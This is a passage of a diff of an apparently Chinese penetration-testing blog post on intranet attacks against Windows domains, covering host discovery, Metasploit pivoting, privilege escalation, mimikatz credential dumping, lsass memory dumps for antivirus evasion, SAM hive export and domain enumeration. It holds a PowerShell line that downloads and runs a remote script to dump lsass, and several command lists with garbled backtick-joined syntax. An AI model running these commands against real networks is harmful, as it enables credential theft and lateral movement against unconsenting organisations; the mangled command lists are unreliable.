-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn -PR 192.168.0.1/24  尝试arp扫描</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">nmap -sn -PR 192.168.0.1/24  尝试arp扫描</code></pre>
 
 <ul>
 <li>netdiscover扫描</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -r 192.168.0.1/24 -i eth0</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">netdiscover -r 192.168.0.1/24 -i eth0</code></pre>
 
 <ul>
 <li>msf的arp扫描模块</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use  auxiliary/scanner/discovery/arp_sweep</span><br><span class="line">msf &gt; show options</span><br><span class="line">msf &gt; set  interface eth0</span><br><span class="line">msf &gt; set  smac 00:0c:29:92:fd:85</span><br><span class="line">msf &gt; set  rhosts 192.168.0.1/24</span><br><span class="line">msf &gt; set  threads 20</span><br><span class="line">msf &gt; set  shost 192.168.0.133 (伪造源ip)</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">msf &gt; use  auxiliary/scanner/discovery/arp_sweep
+msf &gt; show options
+msf &gt; set  interface eth0
+msf &gt; set  smac 00:0c:29:92:fd:85
+msf &gt; set  rhosts 192.168.0.1/24
+msf &gt; set  threads 20
+msf &gt; set  shost 192.168.0.133 (伪造源ip)
+msf &gt; run</code></pre>
 
 <ul>
 <li>msf获取一个shell</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getsystem     另外,在目标机器上扫描时,务必先提权(个人建议,会方便很多),不然扫描过程中可能会有些问题</span><br><span class="line">meterpreter &gt; run autoroute -s 192.168.0.1/24  (添加路由)</span><br><span class="line">meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=192.168.0.1/24</span><br><span class="line">meterpreter &gt; run</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">meterpreter &gt; getsystem     另外,在目标机器上扫描时,务必先提权(个人建议,会方便很多),不然扫描过程中可能会有些问题
+meterpreter &gt; run autoroute -s 192.168.0.1/24  (添加路由)
+meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=192.168.0.1/24
+meterpreter &gt; run</code></pre>
 
 <p>基于smb和netbios的内网主机发现方式</p>
 <p>windows下nbt扫描：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbtscan.exe -m  192.168.0.1/24   非常经典的小工具</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">nbtscan.exe -m  192.168.0.1/24   非常经典的小工具</code></pre>
 
-<p><a href="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190130211235129-219733840.png" target="_blank" rel="noopener"><img src="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190130211235129-219733840.png" alt="img"></a></p>
+<p><a href="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190130211235129-219733840.png" target="_blank" rel="noopener"><img src="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190130211235129-219733840.png" srcset="/img/loading.gif" alt="img"></a></p>
 <p>nbtscan.exe工具下载地址：<a href="http://www.unixwiz.net/tools/nbtscan.html#download" target="_blank" rel="noopener">http://www.unixwiz.net/tools/nbtscan.html#download</a></p>
 <p>linux下nbt扫描：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbtscan.exe -r  192.168.0.1/24</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">nbtscan.exe -r  192.168.0.1/24</code></pre>
 
-<p><a href="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190130211600017-1823180637.png" target="_blank" rel="noopener"><img src="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190130211600017-1823180637.png" alt="img"></a></p>
+<p><a href="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190130211600017-1823180637.png" target="_blank" rel="noopener"><img src="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190130211600017-1823180637.png" srcset="/img/loading.gif" alt="img"></a></p>
 <p>域内扫描</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net view</span><br><span class="line">dsquery computer  其实,域内最好用的也就是nbtscan了</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">net view
+dsquery computer  其实,域内最好用的也就是nbtscan了</code></pre>
 
-<p><a href="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190130211851318-2060640176.png" target="_blank" rel="noopener"><img src="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190130211851318-2060640176.png" alt="img"></a></p>
+<p><a href="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190130211851318-2060640176.png" target="_blank" rel="noopener"><img src="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190130211851318-2060640176.png" srcset="/img/loading.gif" alt="img"></a></p>
 <p>如果计算机名很多的时候，可以利用bat批量ping获取ip</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">setlocal ENABLEDELAYEDEXPANSION</span><br><span class="line">@FOR /F &quot;usebackq eol=- skip=1 delims=\&quot; %%j IN (`net view ^| find &quot;命令成功完成&quot; /v ^|find &quot;The command completed successfully.&quot; /v`) DO (</span><br><span class="line">@FOR /F &quot;usebackq delims=&quot; %%i IN (`@ping -n 1 -4 %%j ^| findstr &quot;Pinging&quot;`) DO (</span><br><span class="line">@FOR /F &quot;usebackq tokens=2 delims=[]&quot; %%k IN (`echo %%i`) DO (echo %%k  %%j)</span><br><span class="line">)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">@echo off
+setlocal ENABLEDELAYEDEXPANSION
+@FOR /F &quot;usebackq eol=- skip=1 delims=\&quot; %%j IN (`net view ^| find &quot;命令成功完成&quot; /v ^|find &quot;The command completed successfully.&quot; /v`) DO (
+@FOR /F &quot;usebackq delims=&quot; %%i IN (`@ping -n 1 -4 %%j ^| findstr &quot;Pinging&quot;`) DO (
+@FOR /F &quot;usebackq tokens=2 delims=[]&quot; %%k IN (`echo %%i`) DO (echo %%k  %%j)
+)
+)</code></pre>
 
 <p>4.hash与明文</p>
 <p>抓取hash最好的工具莫过于mimikatz，不过免杀是个问题。</p>
@@ -492,23 +377,26 @@
 <li>在线读取sam数据库</li>
 </ul>
 <p>(1) 使用mimikatz提取系统hash与明文</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br><span class="line">sekurlsa::logonPasswords  (获取明文用户口令）</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">privilege::debug
+token::elevate
+lsadump::sam
+sekurlsa::logonPasswords  (获取明文用户口令）</code></pre>
 
-<p><a href="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190131151824165-907488630.png" target="_blank" rel="noopener"><img src="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190131151824165-907488630.png" alt="img"></a></p>
+<p><a href="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190131151824165-907488630.png" target="_blank" rel="noopener"><img src="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190131151824165-907488630.png" srcset="/img/loading.gif" alt="img"></a></p>
 <p>破解出的NTLM可以尝试CMD5破解：</p>
-<p><a href="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190131153220198-9152151.png" target="_blank" rel="noopener"><img src="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190131153220198-9152151.png" alt="img"></a></p>
+<p><a href="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190131153220198-9152151.png" target="_blank" rel="noopener"><img src="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190131153220198-9152151.png" srcset="/img/loading.gif" alt="img"></a></p>
 <p>或者尝试 ophcrack 破解：<a href="https://www.objectif-securite.ch/ophcrack.php" target="_blank" rel="noopener">https://www.objectif-securite.ch/ophcrack.php</a></p>
 <p>简单密码可以直接明文显示</p>
-<p><a href="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190131153032527-1803063888.png" target="_blank" rel="noopener"><img src="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190131153032527-1803063888.png" alt="img"></a></p>
+<p><a href="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190131153032527-1803063888.png" target="_blank" rel="noopener"><img src="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190131153032527-1803063888.png" srcset="/img/loading.gif" alt="img"></a></p>
 <p>(2) 使用pwdump7提取系统密码hash</p>
 <p>下载地址：<a href="http://passwords.openwall.net/b/pwdump/pwdump7.zip" target="_blank" rel="noopener">http://passwords.openwall.net/b/pwdump/pwdump7.zip</a></p>
 <p>需要管理员权限执行：</p>
-<p><a href="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190131153826223-715246260.png" target="_blank" rel="noopener"><img src="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190131153826223-715246260.png" alt="img"></a></p>
+<p><a href="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190131153826223-715246260.png" target="_blank" rel="noopener"><img src="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190131153826223-715246260.png" srcset="/img/loading.gif" alt="img"></a></p>
 <p>可以看到已经提取出hash</p>
 <p>(3) 使用powershell脚本提取hash</p>
 <p>hash脚本下载地址：<a href="https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1" target="_blank" rel="noopener">https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1</a></p>
 <p>管理员权限执行powershell命令：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -ep bypass -f Invoke-PowerDump.ps1</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">powershell -ep bypass -f Invoke-PowerDump.ps1</code></pre>
 
 <ul>
 <li>离线读取 sam 数据库</li>
@@ -517,9 +405,12 @@
 <p>导出 sam 数据库文件有以下两种实现方法：</p>
 <p>(1) 保存注册表</p>
 <p>管理员权限，利用 reg 将 sam，system和 security文件导出来，并保存在本地：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM system.hiv</span><br><span class="line">reg save HKLM\SAM sam.hiv</span><br><span class="line">reg save HKLM\SECURITY sercrity.hiv</span><br><span class="line">mimikatz.exe &quot;lsadump::sam /system:system.hiv /sam:sam.hiv /sercrity:sercrity.hiv&quot; exit</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">reg save HKLM\SYSTEM system.hiv
+reg save HKLM\SAM sam.hiv
+reg save HKLM\SECURITY sercrity.hiv
+mimikatz.exe &quot;lsadump::sam /system:system.hiv /sam:sam.hiv /sercrity:sercrity.hiv&quot; exit</code></pre>
 
-<p><a href="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190131161316851-1987021747.png" target="_blank" rel="noopener"><img src="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190131161316851-1987021747.png" alt="img"></a></p>
+<p><a href="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190131161316851-1987021747.png" target="_blank" rel="noopener"><img src="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190131161316851-1987021747.png" srcset="/img/loading.gif" alt="img"></a></p>
 <p>可以看到已提取出hash</p>
 <p>参考链接：<a href="https://3gstudent.github.io/3gstudent.github.io/渗透技巧-通过SAM数据库获得本地用户hash/" target="_blank" rel="noopener">通过SAM数据库获得本地用户hash</a></p>
 <p>通过 dump lsass.exe 进程数据离线免杀抓取明文</p>
@@ -527,16 +418,21 @@
 <p>procdump.exe工具下载地址：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a></p>
 <p>有时遇到杀软，直接在目标机器上抓取密码可能会被杀，这时可以先利用 procdump 把 lsass.exe 进程中的数据导出到指定文件中，再把导出的文件下回到本地用 mimikatz 读取文件中的密码hash，以实现免杀效果，不过需要注意的是，本地读取文件的系统平台和目标的系统需要完全一致。</p>
 <p>先在目标机器上执行：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">32位机器：procdump.exe -accepteula -ma lsass.exe lsass.dmp    </span><br><span class="line">64位机器：procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">32位机器：procdump.exe -accepteula -ma lsass.exe lsass.dmp    
+64位机器：procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp</code></pre>
 
-<p><a href="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190131163106160-903443717.png" target="_blank" rel="noopener"><img src="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190131163106160-903443717.png" alt="img"></a></p>
+<p><a href="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190131163106160-903443717.png" target="_blank" rel="noopener"><img src="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190131163106160-903443717.png" srcset="/img/loading.gif" alt="img"></a></p>
 <p>本地使用mimikatz读取文件中的密码hash</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">mimikatz.exe
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonPasswords full</code></pre>
 
-<p><a href="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190131163257866-2002614982.png" target="_blank" rel="noopener"><img src="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190131163257866-2002614982.png" alt="img"></a></p>
+<p><a href="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190131163257866-2002614982.png" target="_blank" rel="noopener"><img src="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190131163257866-2002614982.png" srcset="/img/loading.gif" alt="img"></a></p>
 <p>可以看到已经提取出系统中的hash与明文</p>
 <p>(2) powershell调用dump脚本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># Public&gt;powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1&apos;);&quot;Get-Process lsass | Out-Minidump&quot;</span><br><span class="line">或者本机执行</span><br><span class="line"># Public&gt;powershell –exec bypass –Command &quot;&amp; &#123;Import-Module &apos;C:\Users\Public\Out-Minidump.ps1&apos;; Get-Process lsass | Out-Minidump&#125;&quot;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined"># Public&gt;powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1&apos;);&quot;Get-Process lsass | Out-Minidump&quot;
+或者本机执行
+# Public&gt;powershell –exec bypass –Command &quot;&amp; &#123;Import-Module &apos;C:\Users\Public\Out-Minidump.ps1&apos;; Get-Process lsass | Out-Minidump&#125;&quot;</code></pre>
 
 <p>关于windows10/2012r2 以后系统的明文密码抓取方式</p>
 <p>在windows10/2012r2 之后的系统版本中，默认情况下是禁用了在内存缓存中存储系统用户明文密码，此时使用mimikatz去抓取密码，会显示null。</p>
@@ -550,7 +446,13 @@
 <p>5.权限维持</p>
 <p>-————————</p>
 <p>1.默认权限配置认知</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[+]普通机器</span><br><span class="line">允许Console：administrator组（domain admins），users组（domain users），backup operators组</span><br><span class="line">允许rdp：administrator组（domain admins），Remote desktop users组</span><br><span class="line"></span><br><span class="line">[+]域控AD</span><br><span class="line">允许Console：administrator组，backup operators组，account operators组，print operators组，server operators组</span><br><span class="line">允许rdp：administrator组，Remote desktop users组</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">[+]普通机器
+允许Console：administrator组（domain admins），users组（domain users），backup operators组
+允许rdp：administrator组（domain admins），Remote desktop users组
+
+[+]域控AD
+允许Console：administrator组，backup operators组，account operators组，print operators组，server operators组
+允许rdp：administrator组，Remote desktop users组</code></pre>
 
 <p>如果出现配置错误，属于权限设置问题。</p>
 <p>当某些普通\不普通用户加入AD的rdp组或其他管理组，当攻击者拿到这些用户的权限时就相当于可以获取到域控制器的权限了。</p>
@@ -572,27 +474,27 @@
 <p>4.域环境横向渗透</p>
 <p>(1)域内信息探测</p>
 <p>windows环境常用命令：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user /domain    #查看域用户``net view /domain    #查看有几个域``net view /domain:XXX  #查看此域内电脑``net ``group` `/domain   #查询域里面的组``net ``group` `&quot;domain computers&quot;` `/domain #查看加入到域内的所有计算机名``net ``group` `&quot;domain admins&quot;` `/domain   #查看域管理员``nltest /dclist:xxx   #查看域控制器``net ``group` `&quot;domain controllers&quot;` `/domain  #查看域控制器``net user hacker /domain   #获得指定账户的详细信息``net accounts /domain    #获得域密码策略设置，密码长短，错误锁定等信息</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">net user /domain    #查看域用户``net view /domain    #查看有几个域``net view /domain:XXX  #查看此域内电脑``net ``group` `/domain   #查询域里面的组``net ``group` `&quot;domain computers&quot;` `/domain #查看加入到域内的所有计算机名``net ``group` `&quot;domain admins&quot;` `/domain   #查看域管理员``nltest /dclist:xxx   #查看域控制器``net ``group` `&quot;domain controllers&quot;` `/domain  #查看域控制器``net user hacker /domain   #获得指定账户的详细信息``net accounts /domain    #获得域密码策略设置，密码长短，错误锁定等信息</code></pre>
 
 <p> dsquery命令探测AD信息：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dsquery computer    ----- 寻找目录中的计算机``dsquery contact    ----- 在目录中查找与指定的搜索条件相匹配的联系人``dsquery subnet     ----- 寻找目录中的子网``dsquery ``group`     `----- 寻找目录中的群组``dsquery ou       ----- 寻找目录中的组织单位``dsquery site      ----- 寻找目录中的站点``dsquery server     ----- 寻找目录中的域控制器``dsquery user      ----- 寻找目录中的用户``dsquery quota     ----- 寻找目录中的配额规格``dsquery partition   ----- 寻找目录中的磁盘分区``dsquery *       ----- 使用标准的LDAP查询在目录中寻找任何对象``dsquery server –domain Yahoo.com | dsget server–dnsname –site  ---搜索域内域控制器的DNS主机名和站点名``dsquery computer domainroot –name *-xp –limit 10        ----- 搜索域内以-xp结尾的机器10台``dsquery user domainroot –name admin* -limit           ---- 搜索域内以admin开头的用户10个``……``……``[注:dsquery来源于Windows Server 2003 Administration Tools Pack]具体参考：http:``//blog.51cto.com/122269875/1716414</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">dsquery computer    ----- 寻找目录中的计算机``dsquery contact    ----- 在目录中查找与指定的搜索条件相匹配的联系人``dsquery subnet     ----- 寻找目录中的子网``dsquery ``group`     `----- 寻找目录中的群组``dsquery ou       ----- 寻找目录中的组织单位``dsquery site      ----- 寻找目录中的站点``dsquery server     ----- 寻找目录中的域控制器``dsquery user      ----- 寻找目录中的用户``dsquery quota     ----- 寻找目录中的配额规格``dsquery partition   ----- 寻找目录中的磁盘分区``dsquery *       ----- 使用标准的LDAP查询在目录中寻找任何对象``dsquery server –domain Yahoo.com | dsget server–dnsname –site  ---搜索域内域控制器的DNS主机名和站点名``dsquery computer domainroot –name *-xp –limit 10        ----- 搜索域内以-xp结尾的机器10台``dsquery user domainroot –name admin* -limit           ---- 搜索域内以admin开头的用户10个``……``……``[注:dsquery来源于Windows Server 2003 Administration Tools Pack]具体参考：http:``//blog.51cto.com/122269875/1716414</code></pre>
 
-<p><a href="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190129214829896-1797555095.png" target="_blank" rel="noopener"><img src="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190129214829896-1797555095.png" alt="img"></a></p>
-<p><a href="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190129215417848-1780114464.png" target="_blank" rel="noopener"><img src="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190129215417848-1780114464.png" alt="img"></a></p>
+<p><a href="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190129214829896-1797555095.png" target="_blank" rel="noopener"><img src="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190129214829896-1797555095.png" srcset="/img/loading.gif" alt="img"></a></p>
+<p><a href="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190129215417848-1780114464.png" target="_blank" rel="noopener"><img src="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190129215417848-1780114464.png" srcset="/img/loading.gif" alt="img"></a></p>
 <p>Net系列命令获取域内信息</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Csvde/ldifde/dsquery/adfind/ldapsearch  #探测更详细信息``使用`Get-SPN`（powershell脚本LDAP中快速查询符合指定得用户、组、或者SPN服务名称）``Nslookup -type=SRV_ldap._tcp  #(寻找域控)``tasklist /v   #列出进程和进程所有者（看是否有域管登陆）``PowerView    #（powershell脚本 辅助找寻定位关键用户，查看域管在线机器）``WinScanX.exe  #远程信息刺探``Winfo.exe    #遍历远程用户名``nmap smb-``enum``-sessions.nse  #（引擎来获取远程机器的登陆session，并且不需要管理权。）``netview.exe   #(它利用`NetSessionEnum`来寻找登陆sessions，利用`NetShareEnum`来找寻共享，利用`NetWkstaUserEnum`来枚举登陆的用户)</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">Csvde/ldifde/dsquery/adfind/ldapsearch  #探测更详细信息``使用`Get-SPN`（powershell脚本LDAP中快速查询符合指定得用户、组、或者SPN服务名称）``Nslookup -type=SRV_ldap._tcp  #(寻找域控)``tasklist /v   #列出进程和进程所有者（看是否有域管登陆）``PowerView    #（powershell脚本 辅助找寻定位关键用户，查看域管在线机器）``WinScanX.exe  #远程信息刺探``Winfo.exe    #遍历远程用户名``nmap smb-``enum``-sessions.nse  #（引擎来获取远程机器的登陆session，并且不需要管理权。）``netview.exe   #(它利用`NetSessionEnum`来寻找登陆sessions，利用`NetShareEnum`来找寻共享，利用`NetWkstaUserEnum`来枚举登陆的用户)</code></pre>
 
 <p>Wmic系列命令使用：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic bios            ----- 查看bios信息``wmic qfe            ----- 查看补丁信息``wmic qfe ``get` `hotfixid      ----- 查看补丁-Patch号``wmic startup          ----- 查看启动项``wmic service          ----- 查看服务``wmic os             ----- 查看OS信息``wmic process ``get` `caption,executablepath,commandline``wmic process call create “process_name” (executes a program)``wmic process ``where` `name=”process_name” call terminate (terminates program)``wmic logicaldisk ``where` `drivetype=3 ``get` `name, freespace, systemname, filesystem, size,``volumeserialnumber (hard drive information)``wmic useraccount (usernames, sid, and various security related goodies)``wmic useraccount ``get` `/ALL``wmic share ``get` `/ALL (you can use ? ``for` `gets help ! )``wmic startup list full (``this` `can be a huge list!!!)``wmic /node:``&quot;hostname&quot;` `bios ``get` `serialnumber (``this` `can be great ``for` `finding warranty info about target)</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">wmic bios            ----- 查看bios信息``wmic qfe            ----- 查看补丁信息``wmic qfe ``get` `hotfixid      ----- 查看补丁-Patch号``wmic startup          ----- 查看启动项``wmic service          ----- 查看服务``wmic os             ----- 查看OS信息``wmic process ``get` `caption,executablepath,commandline``wmic process call create “process_name” (executes a program)``wmic process ``where` `name=”process_name” call terminate (terminates program)``wmic logicaldisk ``where` `drivetype=3 ``get` `name, freespace, systemname, filesystem, size,``volumeserialnumber (hard drive information)``wmic useraccount (usernames, sid, and various security related goodies)``wmic useraccount ``get` `/ALL``wmic share ``get` `/ALL (you can use ? ``for` `gets help ! )``wmic startup list full (``this` `can be a huge list!!!)``wmic /node:``&quot;hostname&quot;` `bios ``get` `serialnumber (``this` `can be great ``for` `finding warranty info about target)</code></pre>
 
 <p>linux常用命令：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/issue      #查看系统名称cat /etc/lsb-release   #查看系统名称``cat /etc/nsswitch    #查看密码登陆策略``route  #查看路由``cat /etc/network/interfaces  #查看网卡配置文件``cat /``var``/log/syslog  #查看系统日志ps aux  #查看进程crontab -l  #计划任务cat /etc/network/interfaces #查看网络配置netstat #查看网络通信showmount -e ip 查看NFS连接ldapsearch -h 192.168.0.1 -x -z 10 -p 指定端口 #查找10条用户记录ldapsearch -x -D ``&quot;cn=administrator,cn=People,dc=unix-center,dc=net&quot;` `-b ``&quot;cn=administrator,cn=People,dc=unix-center,dc=net&quot;` `-h 192.168.0.1 #匿名信息查找管理员信息ldapsearch -x -W -D ``&quot;cn=administrator,cn=People,dc=unix-center,dc=net&quot;` `-b ``&quot;cn=administrator,cn=People,dc=unix-center,dc=net&quot;` `-h 192.168.2.2  #有密码形式查找管理员信息</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">cat /etc/issue      #查看系统名称cat /etc/lsb-release   #查看系统名称``cat /etc/nsswitch    #查看密码登陆策略``route  #查看路由``cat /etc/network/interfaces  #查看网卡配置文件``cat /``var``/log/syslog  #查看系统日志ps aux  #查看进程crontab -l  #计划任务cat /etc/network/interfaces #查看网络配置netstat #查看网络通信showmount -e ip 查看NFS连接ldapsearch -h 192.168.0.1 -x -z 10 -p 指定端口 #查找10条用户记录ldapsearch -x -D ``&quot;cn=administrator,cn=People,dc=unix-center,dc=net&quot;` `-b ``&quot;cn=administrator,cn=People,dc=unix-center,dc=net&quot;` `-h 192.168.0.1 #匿名信息查找管理员信息ldapsearch -x -W -D ``&quot;cn=administrator,cn=People,dc=unix-center,dc=net&quot;` `-b ``&quot;cn=administrator,cn=People,dc=unix-center,dc=net&quot;` `-h 192.168.2.2  #有密码形式查找管理员信息</code></pre>
 
 <p>(2) 域管权限获取</p>
 <p>除了工作组的几种方法外，还有域特别的几种渗透方法。</p>
 <p>1.组策略漏洞（GPP）</p>
 <p>域管理员使用GPP来配置和操作域，常见的操作有远程创建本地用户、映射打印机、映射磁盘等，这些操作有时候需要提供账号密码。当组策略进行分发时，会在 SYSVOL 目录下生成一个xml文件，理所当然的前面提供的账号密码都保存在这个xml文件中，而密码是经过AES加密得，也就是说完全可逆的加密算法，而微软同时也很照顾的公布了加密密钥，所以任何域普通用户就可以读取这些xml文件并使用公开的AES密钥破解密码。组策略漏洞是windows 2008的，而且不一定是groups.xml，其他的xml也可能存在密码。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\domain.com\sysvol\*</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs undefined">dir \\domain.com\sysvol\*</code></pre>
 
 <p>2.Kerberos协议漏洞</p>
 <p>关于Kerberos协议漏洞常见的三种有：MS14-068，Golden ticket（黄金票据），SILVER TICKET（白银票据）</p>
@@ -611,36 +513,44 @@
 </ul>
 <p>具体Pykek工具及下载地址：<a href="https://www.secpulse.com/archives/2874.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/2874.html</a></p>
 <p>github项目地址：<a href="https://github.com/mubix/pykek" target="_blank" rel="noopener">https://github.com/mubix/pykek</a></p>
-<p><a href="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190131222312270-1593921519.png" target="_blank" rel="noopener"><img src="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190131222312270-1593921519.png" alt="img"></a></p>
+<p><a href="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190131222312270-1593921519.png" target="_blank" rel="noopener"><img src="https://img2018.cnblogs.com/blog/1344396/201901/1344396-20190131222312270-1593921519.png" srcset="/img/loading.gif" alt="img"></a></p>
 <ul>
 <li>Kekeo</li>
 </ul>
